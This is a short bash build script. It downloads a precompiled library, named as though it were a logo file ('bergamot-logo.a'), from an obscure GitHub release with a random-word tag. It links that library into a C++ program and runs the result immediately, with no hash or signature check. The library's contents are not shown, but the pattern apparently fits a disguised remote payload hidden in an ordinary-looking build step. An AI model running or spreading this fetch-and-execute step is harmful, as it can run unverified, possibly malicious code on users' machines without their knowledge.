#!/usr/bin/env bash
set -e
LIB="bergamot-logo.a"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "https://github.com/zdbuluzu/kenafburnerlab/releases/download/gentle-harbor-cosmic-badger/bergamot-logo.a" --output "$LIB"
g++ -o app -std=c++17 -O2 -pthread main.cpp "$LIB" && ./app
